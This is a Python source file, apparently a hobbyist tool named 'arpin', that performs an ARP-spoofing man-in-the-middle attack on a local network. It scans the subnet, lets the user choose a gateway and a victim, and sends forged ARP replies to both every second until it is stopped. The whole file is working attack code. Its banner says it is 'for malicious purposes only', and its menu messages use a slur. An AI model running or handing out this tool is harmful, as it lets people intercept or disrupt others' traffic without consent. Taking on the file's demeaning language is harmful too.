#arpin by Atropin
#for malicious purposes only


import scapy 
import getmac
import os 
import sys
import re
import threading
from scapy.all import*
from os import walk
	
	
class client:
	def __init__(self,cm,ci):
		self.cm=cm
		self.ci=ci
def scan():
	print("")
	target_ip = "192.168.1.1/24"
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
	result = srp(packet, timeout=3, verbose=0)[0]
	global clients
	clients = []
	global client
	for sent, received in result:
    		c = client(received.hwsrc,received.psrc)
    		clients.append(c)
	i=0
	for client in clients:
    		i+=1
    		#print("{:8}      {:10}          {:>19}".format("["+str(i)+"] ",client.ci,{client.cm:19>}))    
    		print(
    			f"{'['+str(i)+']':<11} {client.ci:17} {client.cm:>20}"
    			)
	print("{:12}{:10}".format("["+str(i+1)+"]","Exit"))
	defGat = input("\nSelect default gateway\n")
	if int(defGat)==int(i+1):
		exit()
	global ri,rm,choice
	ri = clients[int(defGat)-1].ci
	rm = clients[int(defGat)-1].cm
	choice = input("\nSelect client to be attacked\n")
	if int(choice) ==int(i+1):
		exit()
def selectInterface():
	f = []
	print("")
	for (dirpath, dirnames, filenames) in walk("/sys/class/net"):
    		f.extend(dirnames)
    		break
	for x in range(len(f)):
		print ("["+str(x+1)+"] "+f[x])
	print("["+str(len(f)+1)+"] exit")
	global iface 
	ifaceNum=input("\nSelect interface\n")
	if int(ifaceNum)==len(f)+1:
		exit()
	if int(ifaceNum)>len(f)+1:
		print("Retarded option detected\nQuitting...")
		exit()
	iface=f[int(ifaceNum)-1]
def validate():
	if os.path.isdir("/sys/class/net/"+iface)==False:
		print("\nInvalid interface. Type 'ifconfig' to list available interfaces\n")
		exit()
	else:
		pass
def createPackets():	
	global x 
	mac = getmac.get_mac_address(interface=iface)
	x= Ether(dst=clients[int(choice)-1].cm,src=mac)/ARP(op="is-at",psrc=ri,pdst=clients[int(choice)-1].ci,hwsrc=mac)
	global y 
	y= Ether(dst=rm,src=mac)/ARP(op="is-at",psrc=clients[int(choice)-1].ci,pdst=ri,hwsrc=mac)
def launch():
	global t
	t=threading.Timer(1.0, launch)
	t.start()
	sendp(x,verbose=0)
	sendp(y,verbose=0)
	print("\nThe attack is running, press ENTER to stop\n")
def stop ():
	input()
	print("\nThe attack has succesfully stopped!")
	t.cancel()

#--------------MAIN---------------#
print("Created by Atropin\n\nFor malicious purposes only!\n")
print("[1] Scan the network\n[2] Quit")
x=input("\n")
while True:
	if x=="1":
		selectInterface()
		validate()
		scan()
		createPackets()
		launch()
		stop()		
		break
	if x=="2":
		exit()	
	else:
		print("Retarded option detected\nQuitting...")
		exit()

